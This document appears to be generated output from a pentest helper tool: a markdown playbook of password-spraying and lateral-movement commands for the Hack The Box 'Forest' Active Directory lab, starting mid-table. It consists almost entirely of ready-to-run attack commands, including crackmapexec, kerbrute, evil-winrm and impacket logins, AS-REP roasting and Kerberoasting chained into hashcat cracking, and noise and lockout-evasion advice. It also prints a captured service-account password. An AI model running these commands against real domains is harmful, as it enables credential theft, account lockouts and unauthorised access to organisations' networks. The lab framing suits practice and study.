| Computer Enumeration | `crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --computers` |
| Password Policy | `crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --pass-pol` |
| Domain Trust Enumeration | `crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M enum_trusts` |
| GPO Enumeration | `crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M enum_gpo` |


# Tailored Spray Commands

Based on BloodHound access relationships.

## Summary

- **Users with access:** 2
- **Target machines:** 1
- **Access types:** AdminTo, CanPSRemote

## Local Admin (AdminTo)

1 users, 1 unique target groups

### Group 1: 1 user(s) → 1 target(s)

**Users:** `administrator`

**Targets:**

- `FOREST.HTB.LOCAL`

#### File-based commands

```bash
# Create user and target files
echo -e "administrator" > users_g1.txt
echo -e "FOREST" > targets_g1.txt
crackmapexec smb targets_g1.txt -u users_g1.txt -p '<PASSWORD>'
```

#### Inline bash loop

```bash
for user in administrator; do
  for target in FOREST; do
    crackmapexec smb $target -u $user -p '<PASSWORD>'
  done
done
```

**Alternative protocols:**

```bash
# WinRM (evil-winrm)
evil-winrm -i FOREST -u administrator -p '<PASSWORD>'
```

```bash
# PSExec
impacket-psexec 'HTB/administrator:<PASSWORD>'@FOREST
```

```bash
# WMIExec
impacket-wmiexec 'HTB/administrator:<PASSWORD>'@FOREST
```

## PS Remoting (CanPSRemote)

1 users, 1 unique target groups

### Group 1: 1 user(s) → 1 target(s)

**Users:** `svc-alfresco`

**Targets:**

- `FOREST.HTB.LOCAL`

#### File-based commands

```bash
# Create user and target files
echo -e "svc-alfresco" > users_g1.txt
echo -e "FOREST" > targets_g1.txt
evil-winrm -i targets_g1.txt -u users_g1.txt -p '<PASSWORD>'
```

#### Inline bash loop

```bash
for user in svc-alfresco; do
  for target in FOREST; do
    evil-winrm -i $target -u $user -p '<PASSWORD>'
  done
done
```

**Alternative protocols:**

```bash
# WinRM (CrackMapExec)
crackmapexec winrm FOREST -u svc-alfresco -p '<PASSWORD>'
```

## Monolithic Spray

One attempt per user on their best target. Set `PASSWORD` once at the top.

### Edge Selection Logic

```
  1 user via AdminTo (local admin → SMB auth)
  1 user via CanPSRemote (WinRM → evil-winrm auth)
  0 users via CanRDP (RDP → xfreerdp3 auth)
  Priority: AdminTo > CanPSRemote > CanRDP > ExecuteDCOM > ReadLAPSPassword
  Each user sprayed exactly once on their highest-privilege target
```

### Commands

```bash
PASSWORD='<PASSWORD>'

# --- administrator → FOREST (FOREST) ---
# AdminTo (direct): MATCH (administrator)-[:AdminTo]->(FOREST)
crackmapexec smb FOREST -u administrator -p "$PASSWORD"

# --- svc-alfresco → FOREST (FOREST) ---
# CanPSRemote via privileged it accounts: MATCH (svc-alfresco)-[:MemberOf*]->(privileged it accounts)-[:CanPSRemote]->(FOREST)
evil-winrm -i FOREST -u svc-alfresco -p "$PASSWORD"

```

---

> **NOTE:** Replace `<PASSWORD>` with actual credentials.


## 🔑 Password Spray Recommendations

### Captured Passwords

```
s3rvice
```

### Spray Methods

#### Method 1: SMB-Based Spray (crackmapexec/netexec)

Ports: 445 | Noise: HIGH

```bash
crackmapexec smb <DC_IP> -u users.txt -p 's3rvice' -d htb.local --continue-on-success
```
- ✅ Shows admin access (Pwn3d!), validates creds + checks admin in one step
- ❌ Very noisy (Event logs 4625), triggers lockouts, detected by EDR

#### Method 2: Kerberos TGT-Based Spray (kerbrute)

Ports: 88 | Noise: LOW

```bash
kerbrute passwordspray -d htb.local --dc <DC_IP> users.txt 's3rvice'
```
- ✅ Fastest, stealthiest - only 2 UDP frames per attempt, pre-auth check avoids lockouts for invalid users
- ❌ No admin check (just validates creds), requires valid userlist, Kerberos only

#### Method 3: LDAP/ADSI-Based Spray (PowerShell)

Ports: 389, 636 | Noise: MEDIUM

```bash
Invoke-DomainPasswordSpray -UserList users.txt -Password 's3rvice' -Verbose
```
- ✅ Built into Windows - no external tools needed, uses native APIs, scriptable
- ❌ Windows-only, slower than Kerberos, requires PowerShell access on target

### User Enumeration

**Enumerate valid users via Kerberos pre-auth**
```bash
kerbrute userenum -d htb.local --dc <DC_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt && cut -d' ' -f8 valid_users.txt | cut -d'@' -f1 > users.txt
```

**LDAP enumeration with credentials**
```bash
ldapsearch -x -H ldap://<DC_IP> -D 'htb.local\SVC-ALFRESCO' -w '<PASSWORD>' -b '<DOMAIN_DN>' '(objectClass=user)' sAMAccountName | grep sAMAccountName | cut -d' ' -f2 > users.txt
```

**CME user enumeration (authenticated)**
```bash
crackmapexec smb <DC_IP> -u 'SVC-ALFRESCO' -p '<PASSWORD>' -d htb.local --users | awk '{print $5}' | grep -v '\[' > users.txt
```

**Export users from BloodHound Neo4j (clean output)**
```bash
echo "MATCH (u:User) WHERE u.name IS NOT NULL AND NOT u.name STARTS WITH 'NT AUTHORITY' RETURN u.samaccountname" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' > users.txt
```

**RPC user enumeration**
```bash
rpcclient -U 'SVC-ALFRESCO%<PASSWORD>' <DC_IP> -c 'enumdomusers' | grep -oP '\[.*?\]' | tr -d '[]' | cut -d' ' -f1 > users.txt
```

**enum4linux user enumeration (unauthenticated if allowed)**
```bash
enum4linux -U <DC_IP> | grep 'user:' | cut -d':' -f2 | awk '{print $1}' > users.txt
```

### Spray One-Liners

**1. Full Neo4j Spray (Stealth)**
_Export non-pwned users + passwords from Neo4j, spray with kerbrute_
```bash
echo "MATCH (u:User) WHERE (u.pwned IS NULL OR u.pwned = false) AND u.enabled = true AND u.name IS NOT NULL AND NOT u.name STARTS WITH 'NT AUTHORITY' RETURN u.samaccountname" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' > targets.txt && echo "MATCH (u:User) WHERE u.pwned = true UNWIND u.pwned_cred_values AS cred RETURN cred" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' | sort -u > spray_passwords.txt && for p in $(cat spray_passwords.txt); do kerbrute passwordspray -d htb.local --dc <DC_IP> targets.txt "$p"; sleep 1800; done
```

**2. Neo4j Spray + Admin Check (CME)**
_Export from Neo4j, spray with CME to identify admin access (Pwn3d!)_
```bash
echo "MATCH (u:User) WHERE (u.pwned IS NULL OR u.pwned = false) AND u.enabled = true RETURN u.samaccountname" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' > targets.txt && echo "MATCH (u:User) WHERE u.pwned = true UNWIND u.pwned_cred_values AS cred RETURN cred" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | sort -u > spray_passwords.txt && crackmapexec smb <DC_IP> -u targets.txt -p spray_passwords.txt -d htb.local --continue-on-success --no-bruteforce
```

**3. AS-REP Roast -> Crack -> Spray**
_Roast AS-REP users, crack hashes, spray cracked passwords_
```bash
impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile asrep.txt htb.local/ && hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --show | cut -d':' -f2 >> spray_passwords.txt && crackmapexec smb <DC_IP> -u users.txt -p spray_passwords.txt -d htb.local --continue-on-success --no-bruteforce
```

**4. Kerberoast -> Crack -> Spray**
_Kerberoast SPNs, crack TGS hashes, spray cracked passwords_
```bash
impacket-GetUserSPNs -dc-ip <DC_IP> -request -outputfile kerberoast.txt 'htb.local/SVC-ALFRESCO:s3rvice' && hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --show | cut -d':' -f2 >> spray_passwords.txt && crackmapexec smb <DC_IP> -u users.txt -p spray_passwords.txt -d htb.local --continue-on-success --no-bruteforce
```

**5. CeWL -> Mutate -> Spray**
_Generate wordlist from website, apply mutations, spray_
```bash
cewl -d 2 -m 5 -w cewl_words.txt <TARGET_URL> && hashcat --stdout -r /usr/share/hashcat/rules/best64.rule cewl_words.txt | sort -u > spray_passwords.txt && kerbrute passwordspray -d htb.local --dc <DC_IP> users.txt spray_passwords.txt
```

> **EXAM TIP:** Before spraying, check `net accounts` for lockout policy.
